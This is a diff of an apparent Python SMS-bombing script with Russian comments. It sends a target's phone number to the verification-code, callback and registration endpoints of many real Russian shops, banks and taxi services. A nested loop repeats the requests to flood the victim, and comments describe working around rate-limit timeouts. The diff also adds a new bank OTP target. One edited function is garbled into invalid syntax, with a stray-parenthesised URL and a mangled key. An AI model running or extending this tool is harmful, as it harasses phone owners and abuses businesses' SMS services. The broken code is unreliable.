@@ -6,7 +6,7 @@ import requests
 def pizzalarenzo(phone):
     headers = {
         'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
-        'phone': '8'+phone,
+        'phone': '8' + phone,
         'time': ('%D0%91%D0%BB%D0%B8%D0%B6%D0%B0%D0%B9%D1%88%D0%B5%D0%B5+'
                  '%D0%B2%D1%80%D0%B5%D0%BC%D1%8F')
     }
@@ -18,7 +18,7 @@ def tarelochka(phone):
     headers = {
         'url': 'tarelochcka-2016%40yandex.ru',
         'name_1': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
-        'phone_1': '8'+phone
+        'phone_1': '8' + phone
 
     }
     response_tarelochka = requests.post(url='https://xn--80achdsmuvm0h.xn--p1ai/send/send_1.php',
@@ -28,7 +28,7 @@ def tarelochka(phone):
 def pizzapan(phone):
     headers = {
         'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
-        'mytel': '8'+phone
+        'mytel': '8' + phone
 
     }
     response_pizzapan = requests.post(url='http://pizzapan.ru/send2.php',
@@ -51,7 +51,7 @@ def pizzasushiwok(phone):
         'mod_name': 'call_me',
         'task': 'request_call',
         'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
-        'phone': '8'+phone
+        'phone': '8' + phone
     }
     response_pizzasushiwok = requests.post(url='https://pizzasushiwok.ru/', headers=headers)
     print(response_pizzasushiwok, response_pizzasushiwok.content)
@@ -80,7 +80,7 @@ def okeansushi(phone):
 
 
 def sunlight(phone):
-    snlghtphn = '7'+phone
+    snlghtphn = '7' + phone
     response_sunlight = requests.post(url='https://api.sunlight.net/v3/customers/authorization/',
                                       json={"phone": snlghtphn})
     print(response_sunlight, response_sunlight.content)
@@ -95,7 +95,7 @@ def bk(phone):
     print(response_bk, response_bk.content)
 
 def kfc(phone):
-    kfcphn = '+7'+phone
+    kfcphn = '+7' + phone
     response_kfc = requests.post(url=('https://app-api.kfc.ru/api/v1/'
                                       'common/auth/send-validation-sms'),
                                  json={"phone": kfcphn})
@@ -103,15 +103,15 @@ def kfc(phone):
 
 #  ваще без таймаута походу
 def taxinonstop(phone):
-    txnnstpphn = '8'+phone
+    txnnstpphn = '8' + phone
     response_taxinonstop = requests.post(url='https://taxinonstop.ru/dist/backend/register.php',
                                          json={"cmd": "register", "phone": txnnstpphn,
                                                "taxi_city": "tmn"})
     print(response_taxinonstop, response_taxinonstop.content)
 
 def karusel(phone):
-    krslphn = '7'+phone
-    response_karusel = requests.post(url='https://app.karusel.ru/api/v1/phone/', 
+    krslphn = '7' + phone
+    response_karusel = requests.post(url='https://app.karusel.ru/api/v1/phone/',
                                      json={"phone": krslphn})
     print(response_karusel, response_karusel.content)
 
@@ -143,7 +143,7 @@ def ostin(phone):
               + phone[8:10]
     response_ostin = requests.post(url=('https://ostin.com/ru/ru/secured/myaccount/myclubcard/'
                                         'resultClubCard.jsp?type='
-                                        'sendConfirmCode&phoneNumber='+ostnphn))
+                                        'sendConfirmCode&phoneNumber=' + ostnphn))
     print(response_ostin, response_ostin.text)
 
 def funday(phone):
@@ -151,7 +151,7 @@ def funday(phone):
              + phone[8:10]
     response_funday = requests.post(url=('http://fundayshop.com/ru/ru/secured/myaccount/myclubcard/'
                                          'resultClubCard.jsp?type='
-                                         'sendConfirmCode&phoneNumber='+fndphn))
+                                         'sendConfirmCode&phoneNumber=' + fndphn))
     print(response_funday, response_funday.text)
 
 def sela(phone):
@@ -171,7 +171,7 @@ def sela(phone):
 
 def novextrade(phone):
     nvxtrdphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
-            '-' + phone[8:10]
+                '-' + phone[8:10]
     data = {
         'phone': nvxtrdphn,
         'result_ids': 'notification',
@@ -183,31 +183,37 @@ def novextrade(phone):
 
 def atb(phone):
     atbphn = '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
-            '-' + phone[8:10]
+             '-' + phone[8:10]
     data = {
         'phone': atbphn,
         'page': 'new'
     }
-    response_atb = requests.post(url='https://www.atb.su/local/templates/main/ajax/main/send_sms_new.php', data=data)
+    response_atb = requests.post(url=('https://www.atb.su/local/templates/main/ajax/main/'
+                                      'send_sms_new.php'),
+                                 data=data)
     print(response_atb, response_atb.content)
 
 # timeout 120, used 180
 def lenta(phone):
-    lntphn = '+7'+phone
-    response_lenta = requests.post(url='https://lk.lenta.com/api/v1/authentication/requestValidationCode',
-                                         json={"phone":lntphn})
+    lntphn = '+7' + phone
+    response_lenta = requests.post(url=('https://lk.lenta.com/api/v1/authentication/'
+                                        'requestValidationCode'), json={"phone": lntphn})
     print(response_lenta, response_lenta.content)
 
 # timeout 120, used 180
 def beelinecredit(phone):
     blncrdtphn = '8' + '-' + phone[:3] + '-' + phone[3:6] + '-' + phone[6:10]
 
-    response_beelinecredit = requests.post(url='https://credit-beeline.ru/api/identityproof/sendonetimepassword',
-                                         json={"personalData":{"firstName":"Иван","lastName":"Петров","middleName":"Романович","phoneNumber":blncrdtphn},"consentToDataProcessing":"true"})
+    response_beelinecredit = requests.post(url='(https://credit-beeline.ru/api/identityproof/'
+                                               'sendonetimepassword)',
+                                           json={"personalData": {"firstName": "Иван",
+                                                 "lastName": "Петров", eName": "Романович",
+                                                                  "phoneNumber": blncrdtphn},
+                                                 "consentToDataProcessing": "true"})
     print(response_beelinecredit, response_beelinecredit.content)
 
 def youla(phone):
-    ylphn = '7'+phone
+    ylphn = '7' + phone
     data = {
         'phone': ylphn
     }
@@ -216,21 +222,29 @@ def youla(phone):
 
 def befree(phone):
     bfrphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
-            '-' + phone[8:10]
+             '-' + phone[8:10]
     data = {
         'telephone': bfrphn
     }
     response_befree = requests.post(url='https://www.befree.ru/reward/guest/sendCode/', data=data)
     print(response_befree, response_befree.content)
 
-#  таймаут написано 30 сек, но я вроде его обошел 
+#  таймаут написано 30 сек, но я вроде его обошел
 def mtsbank(phone):
-    mtsbnkphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] + phone[8:10]
+    mtsbnkphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
+                phone[8:10]
     data = {
         'phone': mtsbnkphn
     }
     response_mtsbank = requests.post(url='https://www.mtsbank.ru/ajax/sms.php', data=data)
     print(response_mtsbank, response_mtsbank.content)
+
+def otkr(phone):
+    otkrphn = '7' + phone
+
+    response_otkr = requests.post(url='https://services.open.ru/anketa/api/public/otp',
+                                  json={"phone": otkrphn})
+    print(response_otkr, response_otkr.content)
 
 
 def generate_email():
@@ -250,17 +264,18 @@ def generate_email():
 def run(phone, n):
     taxi2412regist(phone)
     befree(phone)
-    for i in range(n): #  timeout 180
+    for i in range(n):  # timeout 180
         kfc(phone)
         ostin(phone)
         funday(phone)
         lenta(phone)
         beelinecredit(phone)
-        for j in range(3): #  timeout 60
+        for j in range(3):  # timeout 60
             bk(phone)
             karusel(phone)
             taxi2412recover(phone)
-            for k in range(10): #  timeout 0
+            otkr(phone)
+            for k in range(10):  # timeout 0
                 sunlight(phone)
                 taxinonstop(phone)
                 sela(phone)
